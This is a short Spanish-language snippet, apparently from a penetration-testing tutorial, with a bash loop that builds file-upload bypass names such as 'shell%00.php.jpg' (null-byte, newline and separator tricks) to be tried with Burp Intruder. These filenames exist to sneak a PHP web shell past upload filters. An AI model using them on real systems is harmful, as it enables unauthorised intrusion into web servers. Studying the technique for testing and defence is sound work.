Generas combinaciones automáticamente:

```bash
for char in '%00' '%0a' '/' '.' ':'; do
  echo "shell$char.php.jpg"
done
```

👉 Luego pruebas con Burp Intruder
